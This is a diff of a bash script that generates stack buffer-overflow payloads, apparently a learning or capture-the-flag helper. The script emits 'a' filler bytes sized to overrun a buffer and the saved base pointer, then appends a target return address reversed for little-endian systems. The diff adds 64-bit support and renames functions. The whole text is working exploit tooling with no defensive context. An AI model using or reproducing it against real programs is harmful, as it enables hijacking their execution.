@@ -1,6 +1,6 @@
 #!/bin/bash
 
-getRawAddress() {
+get_raw_address() {
 
     local hexAddress="${1}"
     local hexAddressLength=${#hexAddress}
@@ -10,15 +10,16 @@ getRawAddress() {
     local bytesIndex=""
     local assembledBytes=""
 
-    if [ $(( ${hexAddressLength} % 2 )) -eq 0 ]
+    if [ $(( ${hexAddressLength} % 2 )) -eq 0 2> /dev/null ]
     then
         bytesSize=$(( ${hexAddressLength} / 2 - 1))
         bytesIndex=${bytesSize}
     else
-        echo "ERROR: Invalid hexadecimal address."
+        echo "[ERROR] Invalid hexadecimal address."
         exit 1
     fi
 
+    # Reverse the hex address for little-endian systems.
     for i in $(seq 1 ${hexAddressLength}); do
 
         byte="${byte}${hexAddress:i-1:1}"
@@ -30,7 +31,7 @@ getRawAddress() {
             byte=""
             ((bytesIndex--))
         fi
-    
+
     done
 
     for byte in "${bytes[@]}"; do
@@ -43,7 +44,7 @@ getRawAddress() {
 
 }
 
-getRepeatedString() {
+get_repeated_string() {
 
     local repeatCount=${1}
     local charToRepeat="a"
@@ -65,22 +66,26 @@ getRepeatedString() {
 }
 
 
-getPayload() {
+get_payload() {
 
     local hexAddress="${1}"
     local bufferSizeInBytes=${2}
-    local extraSizeInBytes=4
-    local totalOverwriteSize=$(( ${bufferSizeInBytes} + ${extraSizeInBytes} ))
-    local rawAddress="$(getRawAddress ${hexAddress})"
-    local payload="$(getRepeatedString ${totalOverwriteSize})${rawAddress}"
+    local basePointerSizeInBytes=4
+    if [ -n ${BO_TARGET_ARCH} ] && [ ${BO_TARGET_ARCH} -eq 64 2> /dev/null ]
+    then
+        basePointerSizeInBytes=8
+    fi
+    local totalOverwriteSize=$(( ${bufferSizeInBytes} + ${basePointerSizeInBytes} ))
+    local rawAddress="$(get_raw_address ${hexAddress})"
+    local payload="$(get_repeated_string ${totalOverwriteSize})${rawAddress}"
 
     echo "${payload}"
 
 }
 
 targetHexAddress="${1}"
-bufferSizeInBytes="${2}"
+bufferSize="${2}"
 
-getPayload "${targetHexAddress}" "${bufferSizeInBytes}"
+get_payload "${targetHexAddress}" "${bufferSize}"
 
 exit
